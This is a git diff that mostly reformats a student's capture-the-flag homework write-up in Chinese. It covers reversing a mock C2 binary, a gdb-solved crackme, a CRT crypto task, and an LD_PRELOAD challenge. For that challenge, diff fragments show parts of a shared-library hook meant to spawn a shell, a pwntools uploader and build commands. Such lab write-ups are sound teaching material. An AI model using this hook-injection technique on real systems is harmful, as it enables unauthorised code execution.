@@ -1,4 +1,8 @@
-Name: 何秉學	ID: R11921A16
+# NTU CS HW0 Write Up
+:::spoiler TOC
+[TOC]
+:::
+
 ## Easy C2
 * Flag: `FLAG{C2_cmd_in_http_header}`
 ### Description
@@ -8,12 +12,12 @@ Name: 何秉學	ID: R11921A16
 Google 關鍵字：IDA freeware、Ghidra、malware C2
 ### 解題思路
 1. Simple 解題思路
-    ```bash
+    ```bash!
     $ file easy-c2
     easy-c2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8fa6ee42a706cfc93d97d04b3ff5e300b9f8ae02, for GNU/Linux 3.2.0, with debug_info, not stripped
     ```
 2. IDA
-    ```cpp
+    ```cpp!
     int __cdecl main(int argc, const char **argv, const char **envp)
     {
       int sockfd; // [rsp+1Ch] [rbp-24h]
@@ -21,7 +25,7 @@ Google 關鍵字：IDA freeware、Ghidra、malware C2
       char *enc_flag; // [rsp+28h] [rbp-18h]
       char *host; // [rsp+30h] [rbp-10h]
       unsigned __int64 v8; // [rsp+38h] [rbp-8h]
-    
+
       v8 = __readfsqword(0x28u);
       enc_flag = byte_20F0;
       host = "127.0.0.1";
@@ -37,7 +41,7 @@ Google 關鍵字：IDA freeware、Ghidra、malware C2
     ```
     可以看得出來他會連localhost:11187，然後把decode過後的flag給送出去，所以只要會nc的都可以直接聽該port的訊息
 ### Exploit
-```bash
+```bash!
 $ nc -lvp 11187
 Listening on 0.0.0.0 11187
 Connection received on localhost 54028
@@ -51,7 +55,7 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Geck
 透過此題目希望學生們可以先自行摸索過各種 SRE(Software Reverse-Engineering) 的工具與流程。 給你一些關鍵字用: IDA Freeware, Ghidra, gdb (GNU Debugger), Dynamic Analysis
 ### 解題思路
 1. Simple 解題思路
-    ```bash
+    ```bash!
     $ file baby-crackme
     baby-crackme: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6cc98ffd919e39311d3014a8bd77c2c8968ca2a9, for GNU/Linux 3.2.0, stripped
     $ ./baby-crackme
@@ -60,14 +64,14 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Geck
     Invalid license!
     ```
 2. IDA
-   
-    ```cpp
+    :::spoiler IDA Decompile Code(Main Function)
+    ```cpp!
     __int64 __fastcall main(int a1, char **a2, char **a3)
     {
       __int64 input_flag[4]; // [rsp+0h] [rbp-30h] BYREF
       int v5; // [rsp+20h] [rbp-10h]
       unsigned __int64 v6; // [rsp+28h] [rbp-8h]
-    
+
       v6 = __readfsqword(0x28u);
       memset(input_flag, 0, sizeof(input_flag));
       v5 = 0;
@@ -81,8 +85,9 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Geck
       return 0LL;
     }
     ```
-    
-    ```cpp
+    :::
+    :::spoiler IDA Decompile Code(Scan License)
+    ```cpp!
     _BOOL8 __fastcall scan_license(const char *input_flag, int a2, int _0xBACEB00C)
     {
       unsigned __int8 v5; // [rsp+1Bh] [rbp-35h]
@@ -93,7 +98,7 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Geck
       __int64 v10; // [rsp+38h] [rbp-18h]
       int v11; // [rsp+40h] [rbp-10h]
       unsigned __int64 v12; // [rsp+48h] [rbp-8h]
-    
+
       v12 = __readfsqword(0x28u);
       *s1 = 0LL;
       v8 = 0LL;
@@ -109,10 +114,11 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Geck
       return strcmp(s1, input_flag) == 0;
     }
     ```
+    :::
     
 3. 如果按照上面得到的code寫script會出事，具體來說會出啥事不好說，但總之IDA時不時會翻不出來也見怪不怪，反正有問題一率動態跟，至於要跟到哪裡(因為沒有main symbol，所以也不好定位)，我是直接用pwntools的raw_input()強制斷在input的地方，接著就跳到比對的部分，然後flag就出現在stack上了
 ### Exploit
-```bash
+```bash!
 $ gdb
 gef➤ at {PID}
 gef➤ fin # until to scan_license function
@@ -130,7 +136,7 @@ Flag Format：FLAG{...}
 ### 解題思路
 這一題主要的想法很簡單，就是給他一個so file，然後她會直接用這個so file當作LD_PRELOAD，執行./chall，所以我們要做的事情概念很簡單，就是給他一個有問題的so file，然後當他執行椅面的function時，就會執行我們給他的惡意指令，例如開shell
 ### Exploit
-```cpp
+```cpp!
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdint.h>
@@ -149,7 +155,7 @@ void* sleep(size_t size)
 }
 ```
 
-```python
+```python!
 from base64 import b64encode
 from pwn import *
 
@@ -165,7 +171,7 @@ r.sendline(b64encode(ld_file))
 r.interactive()
 ```
 
-```bash
+```bash!
 $ gcc -fPIC -shared -o libmyhook.so exp-hook.c -ldl
 $ LD_PRELOAD=./libmyhook.so ./chall    # To make sure it's working
 $ python exp.py
@@ -194,7 +200,8 @@ Easy crypto problem with simple tricks.
 
 Flag Format: FLAG{...}
 ### Source Code
-```python
+:::spoiler Source Code
+```python=
 from secret import flag
 from Crypto.Util.number import bytes_to_long, getPrime
 
@@ -220,6 +227,7 @@ print(f"mods = {xorrrrr(mods)}")
 # mods = [2286703839, 2358297603, 3964421567, 3907762623, 2849800663, 2382674777, 2503252379, 2798053355, 3995552795, 2910773165, 3724203063, 2416156797, 2179309517, 3641528223, 2846518171, 2688752197, 4248246955, 2871652981, 2639686887, 4182550363]
 
 ```
+:::
 ### 解題思路
 我真的脫離crypto太久了，久沒做題就生疏了，這題其實也...沒那麼難，應該還是有點難啦
 1. Analyze Process
@@ -263,7 +271,7 @@ secret\equiv\ hint[2]*{muls[2]}^{-1}\ (mod\ mods[2])\\
 $$
 再利用CRT的解法，secret就出來了
 ### Exploit
-```python
+```python=
 from Crypto.Util.number import *
 from functools import reduce
 
